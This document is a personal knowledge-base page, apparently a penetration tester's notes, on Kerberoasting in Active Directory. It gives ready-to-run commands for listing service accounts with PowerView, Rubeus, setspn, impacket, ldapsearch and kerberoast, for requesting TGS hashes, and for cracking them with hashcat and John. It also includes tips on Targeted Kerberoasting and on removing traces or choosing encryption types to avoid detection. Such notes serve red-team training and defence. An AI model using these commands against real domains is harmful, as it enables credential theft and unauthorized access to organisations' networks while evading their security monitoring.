public:: true

- In case a [SPN](((655e0fad-5b48-42ce-b82a-09cd0e4a9322))) is associated to an AD user account instead of an AD computer account, then the service instance that SPN is registered for **will be run in the context of that user**.
- #+BEGIN_NOTE
  As opposed to *[AD computer account](((655e3185-f921-4b07-bb00-e397a2486fc6)))*, the *AD user account* password might be bruteforced.
  #+END_NOTE
- When the KDC returns a [TGS-REP](((655b6438-ee0f-4168-8a40-754613d2b793))) it also returns [some information](((655a24c7-b91e-4a45-8468-c565395f566e))) encrypted with the password of user associated to the SPN.
- The Kerberoasting attack consist on targeting services ran by AD user account.
	- Search for services ran by AD user accounts
	  logseq.order-list-type:: number
	- File TGS-REQs against the KDC for found services
	  logseq.order-list-type:: number
	- Retrieve TGS-REPs
	  logseq.order-list-type:: number
		- The KDC always return a TGS-REP (if we can file a TGS-REQ from a domain user) beacuse no checks are performed to confirm whether we have any permissions to access the service hosted by the SPN. These checks are performed as a second step [only when connecting to the service itself](((655b6438-6055-4038-b37b-457c7b623610))).
	- Try to bruteforce TGS-REPs offline to retrieve the AD user account password
	  logseq.order-list-type:: number
	- Loot
	  logseq.order-list-type:: number
- id:: 655e327e-5e4b-4260-828e-33941dad976c
  #+BEGIN_TIP
  In case you have **GenericWrite** or **GenericAll** permissions on another AD user account you could reset the user's password but *this may raise suspicion*. However, you could also [set an SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) for the user *(kerberoast the account)* and crack the password hash in an attack named **Targeted Kerberoasting**.
  
  Do not forget to delete the SPN once you've obtained the hash!
  #+END_TIP
- Retrieve the list of SPNs associated to AD users accounts.
  *(Kerberoastable users)*
	- #+BEGIN_TIP
	  We know that a user account is being used to run a service because his `ServicePrincipalName` property is not null.
	  #+END_TIP
	- From Windows
	  id:: 655e1f7d-ff2f-48b3-b240-c888d0cfb1b1
		- With PowerView
			- id:: 655e2029-2d0e-476f-9c58-c69ce7906fa7
			  ```powershell
			  # List any service principals associated with an AD user account
			  Get-NetUser -SPN | select samaccountname,serviceprincipalname
			  ```
		- With [[Rubeus]]
			- id:: 656849f2-846c-490f-9af4-8d1cb413e0dc
			  ```powershell
			  .\Rubeus.exe kerberoast /stats
			  ```
		- With built-in tools
			- id:: 65684a10-0764-4ca6-ad8e-1053e99ded78
			  ```cmd
			  setspn.exe -Q */*
			  ```
	- From Linux
		- With [[GetUserSPNs]]
		  id:: 655e2491-e204-4c69-859d-53d7425c4419
			- id:: 656849d0-d310-4cca-9f69-9af864f36474
			  ```bash
			  # List any service principals associated with an AD user account
			  impacket-GetUserSPNs -dc-ip domain-controller-ip 'domain.tld/username:password'
			  
			  # List any service principals associated with an AD user account (Pass-the-Hash)
			  impacket-GetUserSPNs -dc-ip domain-controller-ip -hashes lm-hash:nt-hash 'domain.tld/username'
			  ```
		- With LDAP
			- ```bash
			  ldapsearch -LLL -x -H ldap://dc01.hpbank.local -D "da@hpbank.local" -w 'P@ssw0rd' -b dc=hpbank,dc=local "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userPrincipalName memberOf
			  ```
		- With [Kerberoast]([[Kerberoast tool]])
		  id:: 656853b7-62f7-4e01-a4a4-7c3ade091299
			- This tool asks for aes 128/256 encrypted tickets. Making the crack process way harder, but also decreasing the detection risk.
			- id:: 6568549a-34f2-467e-a9b5-c991a40f24ba
			  ```bash
			  # All user in the list
			  kerberoast spnroast 'kerberos+pw://HPBANK\user:P@ssw0rd@192.168.0.122' -t list_of_users_with_spn.txt
			  ```
			  ```bash
			  # Single user
			  kerberoast spnroast 'kerberos+pw://HPBANK\user:P@ssw0rd@192.168.0.122'<kerberos_connection_url> -u user
			  ```
- #+BEGIN_NOTE
  Above mentioned tools [typically request](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) **RC4** encryption when performing the attack and initiating TGS-REQ requests.
  
  This is because *RC4* is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as [[Hashcat]], compared to other encryption algorithms such as *AES-128* and *AES-256*.
  
  #+BEGIN_CAUTION
  Requesting RC4 encrypted tickets can be (and probably will be) detected by SOC ([Sigma Rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_rc4_kerberos.yml))
  #+END_CAUTION
  
  *RC4* (type 23) hashes begin with `$krb5tgs$23$*` while *AES-256* (type 18) start with `$krb5tgs$18$*`.
  #+END_NOTE
- Retrieve TGS-REPs for Kerberoastable users
	- From Windows with [[Rubeus]]
	  id:: 655e28cb-6916-4e6a-acbf-448824638693
		- This tool search for SPNs associated with with AD user accounts and request TGS-REP accordingly.
		- It needs to be ran from compromised windows machine in the context of an domain user.
		- ```powershell
		  .\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
		  ```
			- If the `/tgtdeleg` flag is supplied, the [tgtdeleg](https://github.com/GhostPack/Rubeus/tree/1155140b15008259be4fb05b7c28fc03e807a626#tgtdeleg) trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If this flag is used, accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested. More info [here](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/).
	- From Linux with [[GetUserSPNs]]
	  id:: 655e2ce7-cc6b-42f9-8adf-a6e93a8956dd
		- id:: 6564d529-277a-4c22-afa2-90cccfa1e991
		  ```bash
		  impacket-GetUserSPNs -request -dc-ip 192.168.50.70 -outputfile hashes.kerberoast corp.com/pete
		  ```
		- `-request` - is specified to request the [TGS-REP](((655b6438-ee0f-4168-8a40-754613d2b793))).
		- `-dc-ip` - The KDC (domain controller) IP
		- `corp.com/pete` - is the domain user from where we can query the DC. We'll need to input his password.
		- `-outputfile hashes.kerberoast` - file to save captured hashes.
- Crack **Kerberos 5 TGS-REP** hashes
  id:: 655e2b6a-bc1a-494a-86e2-c23880ba612c
	- With [[Hashcat]] with the [`-m 13100`](https://hashcat.net/wiki/doku.php?id=example_hashes) option.
	  ```bash
	  # 13100 - Kerberos 5, etype 23, TGS-REP (RC4)
	  # 19600 - Kerberos 5, etype 17, TGS-REP (AES128-CTS-HMAC-SHA1-96)
	  # 19700 - Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
	  
	  sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt \
	  	-r /usr/share/hashcat/rules/best64.rule --force
	  ```
	- `-m 13100` - specifies the correct mode
	- `hashes.kerberoast` - is the file with the hashes, as it was output by `impacket-GetNPUsers` or `Rubeus`
	- `rockyou.txt` - the wordlist we want to use
	- `best64.rule` - the rules to apply to the wordlist
	- `--force` - to run `hashcat` in Kali
	- With [[JTR]]
		- id:: 65685709-5a71-4be1-8cc9-aafb468933ad
		  ```bash
		  john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
		  ```